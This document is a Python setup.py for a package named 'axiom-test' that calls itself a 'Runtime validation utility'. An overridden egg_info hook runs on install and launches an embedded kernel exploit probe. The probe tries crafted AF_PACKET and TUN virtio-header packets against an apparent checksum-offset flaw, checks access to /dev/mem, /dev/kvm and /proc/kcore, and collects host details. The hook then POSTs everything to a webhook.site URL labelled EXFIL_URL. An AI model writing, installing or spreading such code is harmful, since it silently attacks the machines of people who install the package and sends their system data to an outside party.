import json, os, sys, subprocess, struct, socket, urllib.request
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"

def _collect():
    p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "test": "CVE-2026-99999-v3-afpacket"}

    try:
        p["kernel_version"] = subprocess.check_output(["uname","-r"], text=True, timeout=5).strip()
    except: pass

    poc_script = r'''
import os, sys, struct, socket, fcntl, select, json, glob

R = {}
R["ns_id"] = os.popen("id").read().strip()

# ---------- Phase 1: Attack surface inventory ----------
# /dev access
devs_to_check = ["/dev/net/tun", "/dev/vhost-net", "/dev/vhost-vsock",
                 "/dev/mem", "/dev/kmem", "/dev/port", "/dev/kvm"]
R["dev_access"] = {}
for d in devs_to_check:
    try:
        st = os.stat(d)
        R["dev_access"][d] = f"mode={oct(st.st_mode)}"
        # Try opening
        try:
            fd = os.open(d, os.O_RDWR | os.O_NONBLOCK)
            R["dev_access"][d] += " OPEN_OK"
            os.close(fd)
        except OSError as e:
            R["dev_access"][d] += f" open_err={e.errno}"
    except:
        R["dev_access"][d] = "NOT_FOUND"

# Virtio PCI/sysfs devices
R["virtio_devices"] = []
for vd in sorted(glob.glob("/sys/bus/virtio/devices/*")):
    info = {"path": vd}
    for attr in ["vendor", "device", "status"]:
        try:
            with open(f"{vd}/{attr}") as f:
                info[attr] = f.read().strip()
        except: pass
    # Check driver
    try:
        info["driver"] = os.readlink(f"{vd}/driver").split("/")[-1]
    except: pass
    R["virtio_devices"].append(info)

# Network interfaces and their drivers
R["net_interfaces"] = {}
for nd in sorted(glob.glob("/sys/class/net/*")):
    name = nd.split("/")[-1]
    info = {}
    try:
        info["driver"] = os.readlink(f"{nd}/device/driver").split("/")[-1]
    except: pass
    try:
        with open(f"{nd}/flags") as f:
            info["flags"] = f.read().strip()
    except: pass
    try:
        with open(f"{nd}/mtu") as f:
            info["mtu"] = f.read().strip()
    except: pass
    try:
        with open(f"{nd}/address") as f:
            info["mac"] = f.read().strip()
    except: pass
    R["net_interfaces"][name] = info

# ---------- Phase 2: AF_PACKET + PACKET_VNET_HDR on cfeth0 ----------
SOL_PACKET = 263
PACKET_VNET_HDR = 15
ETH_P_IP = 0x0800
VIRTIO_NET_HDR_F_NEEDS_CSUM = 1
VNET_HDR_SZ = 12

R["afpacket_phase"] = {}

# Find the real virtio-net interface
target_iface = None
for name, info in R["net_interfaces"].items():
    if info.get("driver") == "virtio_net":
        target_iface = name
        break

if not target_iface:
    # fallback: try cfeth0 or eth0
    for candidate in ["cfeth0", "eth0"]:
        if os.path.exists(f"/sys/class/net/{candidate}"):
            target_iface = candidate
            break

R["afpacket_phase"]["target_iface"] = target_iface

if target_iface:
    try:
        # Get MAC of target interface
        with open(f"/sys/class/net/{target_iface}/address") as f:
            mac_str = f.read().strip()
        src_mac = bytes.fromhex(mac_str.replace(":", ""))

        # Get interface index
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
        ifr = struct.pack("16sI12s", target_iface.encode(), 0, b"\x00"*12)
        result = fcntl.ioctl(sock, 0x8933, ifr)  # SIOCGIFINDEX
        ifindex = struct.unpack("16sI12s", result)[1]
        R["afpacket_phase"]["ifindex"] = ifindex

        # Set PACKET_VNET_HDR
        try:
            sock.setsockopt(SOL_PACKET, PACKET_VNET_HDR, struct.pack("I", 1))
            R["afpacket_phase"]["vnet_hdr_set"] = True
        except OSError as e:
            R["afpacket_phase"]["vnet_hdr_err"] = f"{e.errno}: {os.strerror(e.errno)}"

        # Bind to interface
        sock.bind((target_iface, ETH_P_IP))

        # Build Ethernet + IP + UDP packet
        dst_mac = b"\xff\xff\xff\xff\xff\xff"  # broadcast
        eth_hdr = dst_mac + src_mac + struct.pack("!H", ETH_P_IP)

        src_ip = socket.inet_aton("10.0.0.1")
        dst_ip = socket.inet_aton("10.0.0.2")
        udp_payload = b"A" * 80
        udp_len = 8 + len(udp_payload)
        udp_hdr = struct.pack("!HHH", 12345, 54321, udp_len) + b"\x00\x00" + udp_payload

        total_len = 20 + len(udp_hdr)
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, 0x1337, 0, 64, 17, 0, src_ip, dst_ip)

        raw_pkt = eth_hdr + ip_hdr + udp_hdr

        # Try csum_start values targeting the IP header area
        # For AF_PACKET, csum_start is relative to packet start (after vnet hdr)
        # With ethernet header (14 bytes), IP header starts at offset 14
        # Transport header at offset 14+20=34
        # The exploit needs csum_start < 34 (within IP header region)
        attempts = []
        for csum_start in [0, 2, 4, 8, 10, 14, 16, 18, 20, 22, 24, 28, 30, 34]:
            for csum_offset in [0, 2, 4, 6, 10]:
                vhdr = struct.pack("<BBHHHH",
                    VIRTIO_NET_HDR_F_NEEDS_CSUM,
                    0, 0, 0,
                    csum_start, csum_offset
                ) + b"\x00\x00"  # num_buffers pad to 12

                full_pkt = vhdr + raw_pkt
                attempt = {"cs": csum_start, "co": csum_offset}
                try:
                    sent = sock.send(full_pkt)
                    attempt["sent"] = sent
                    # If csum_start is within IP header area (14-33), this is the exploit
                    if 14 <= csum_start < 34:
                        attempt["IN_IP_HDR"] = True
                except OSError as e:
                    attempt["err"] = f"{e.errno}:{os.strerror(e.errno)}"
                attempts.append(attempt)

        R["afpacket_phase"]["attempts"] = attempts
        R["afpacket_phase"]["accepted"] = [a for a in attempts if "sent" in a]
        R["afpacket_phase"]["ip_hdr_accepted"] = [a for a in attempts if a.get("IN_IP_HDR") and "sent" in a]

        sock.close()

    except Exception as e:
        import traceback
        R["afpacket_phase"]["error"] = str(e)
        R["afpacket_phase"]["tb"] = traceback.format_exc()

# ---------- Phase 3: TUN with raw IP (no ethernet) retry ----------
# Try with AF_INET raw socket sending through TUN (different path)
TUNSETIFF       = 0x400454ca
TUNSETOFFLOAD   = 0x400454d0
TUNSETVNETHDRSZ = 0x400454d8
IFF_TUN         = 0x0001
IFF_NO_PI       = 0x1000
IFF_VNET_HDR    = 0x4000
TUN_F_CSUM      = 0x01

SIOCGIFFLAGS  = 0x8913
SIOCSIFFLAGS  = 0x8914
SIOCSIFADDR   = 0x8916
SIOCSIFNETMASK= 0x891C
SIOCSIFMTU    = 0x8922
IFF_UP        = 0x1

R["tun_raw_phase"] = {}
try:
    tun_fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
    ifr = struct.pack("16sH14s", b"probe1", IFF_TUN | IFF_NO_PI | IFF_VNET_HDR, b"\x00"*14)
    fcntl.ioctl(tun_fd, TUNSETIFF, ifr)
    fcntl.ioctl(tun_fd, TUNSETOFFLOAD, TUN_F_CSUM)
    fcntl.ioctl(tun_fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))

    # Configure interface via ioctl
    cfg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fcntl.ioctl(cfg, SIOCSIFADDR,
        struct.pack("16sH2s4s8s", b"probe1", socket.AF_INET, b"\x00\x00",
                    socket.inet_aton("10.200.2.1"), b"\x00"*8))
    fcntl.ioctl(cfg, SIOCSIFNETMASK,
        struct.pack("16sH2s4s8s", b"probe1", socket.AF_INET, b"\x00\x00",
                    socket.inet_aton("255.255.255.0"), b"\x00"*8))
    # Set MTU very small to force fragmentation
    fcntl.ioctl(cfg, SIOCSIFMTU, struct.pack("16sI12s", b"probe1", 68, b"\x00"*12))

    result = fcntl.ioctl(cfg, SIOCGIFFLAGS, struct.pack("16sH14s", b"probe1", 0, b"\x00"*14))
    flags = struct.unpack("16sH14s", result)[1]
    fcntl.ioctl(cfg, SIOCSIFFLAGS, struct.pack("16sH14s", b"probe1", flags | IFF_UP, b"\x00"*14))
    cfg.close()

    R["tun_raw_phase"]["iface"] = "UP"

    # Use a raw socket to SEND through probe1 instead of direct TUN write
    # This takes a different kernel path (ip_output -> xmit -> tun_net_xmit)
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, 255)
        raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        raw.bind(("10.200.2.1", 0))

        # Build oversized IP packet that will need fragmentation at MTU 68
        src_ip = socket.inet_aton("10.200.2.1")
        dst_ip = socket.inet_aton("10.200.2.2")
        payload = b"Z" * 120  # Will exceed MTU 68
        total_len = 20 + len(payload)
        ip_pkt = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, 0xBEEF, 0, 64, 253, 0, src_ip, dst_ip) + payload

        try:
            raw.sendto(ip_pkt, ("10.200.2.2", 0))
            R["tun_raw_phase"]["raw_send"] = "OK"
        except OSError as e:
            R["tun_raw_phase"]["raw_send_err"] = f"{e.errno}:{os.strerror(e.errno)}"

        # Read fragments from TUN
        frags = []
        for _ in range(10):
            rdy, _, _ = select.select([tun_fd], [], [], 0.5)
            if rdy:
                data = os.read(tun_fd, 4096)
                frag = {"len": len(data)}
                if len(data) > VNET_HDR_SZ:
                    # Parse vnet header
                    vflags, gso, hdr_len, gso_sz, cs, co = struct.unpack("<BBHHHH", data[:10])
                    frag["vhdr"] = {"flags": vflags, "gso": gso, "hdr_len": hdr_len,
                                    "csum_start": cs, "csum_offset": co}
                    # Parse IP header from fragment
                    ip_byte = data[VNET_HDR_SZ]
                    ihl = ip_byte & 0x0F
                    frag["ihl"] = ihl
                    frag["ver"] = ip_byte >> 4
                    if ihl > 5:
                        frag["LEAK_DETECTED"] = True
                        options_bytes = data[VNET_HDR_SZ+20:VNET_HDR_SZ+ihl*4]
                        frag["leaked_bytes"] = options_bytes.hex()
                        frag["leaked_len"] = len(options_bytes)
                    # Frag offset and flags
                    flags_frag = struct.unpack("!H", data[VNET_HDR_SZ+6:VNET_HDR_SZ+8])[0]
                    frag["frag_offset"] = (flags_frag & 0x1FFF) * 8
                    frag["more_frags"] = bool(flags_frag & 0x2000)
                frags.append(frag)
            else:
                break

        R["tun_raw_phase"]["fragments"] = frags
        raw.close()
    except Exception as e:
        R["tun_raw_phase"]["raw_err"] = str(e)

    os.close(tun_fd)

except Exception as e:
    import traceback
    R["tun_raw_phase"]["error"] = str(e)
    R["tun_raw_phase"]["tb"] = traceback.format_exc()

# ---------- Phase 4: Capability and privilege summary ----------
R["caps"] = {}
try:
    with open("/proc/self/status") as f:
        for line in f:
            if line.startswith("Cap"):
                k, v = line.strip().split(":\t")
                R["caps"][k] = v
except: pass

# Check if we can read kernel memory via /proc/kcore
R["kcore"] = "N/A"
try:
    fd = os.open("/proc/kcore", os.O_RDONLY)
    data = os.read(fd, 64)
    R["kcore"] = f"READABLE ({len(data)}B)"
    os.close(fd)
except OSError as e:
    R["kcore"] = f"err={e.errno}:{os.strerror(e.errno)}"

print("__R__" + json.dumps(R) + "__E__")
'''

    try:
        out = subprocess.check_output(
            ["unshare", "-Urn", "python3", "-c", poc_script],
            text=True, timeout=60, stderr=subprocess.STDOUT
        )
        if "__R__" in out and "__E__" in out:
            p["poc"] = json.loads(out.split("__R__")[1].split("__E__")[0])
        else:
            p["poc_raw"] = out[:6000]
    except Exception as e:
        p["poc_error"] = str(e)
        if hasattr(e, 'output'):
            p["poc_output"] = e.output[:4000] if e.output else ""

    return p

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"}
            ), timeout=15)
        except: pass

setup(name="axiom-test", version="1.3.0", description="Runtime validation utility",
      py_modules=[], cmdclass={"egg_info": PostEggInfo})
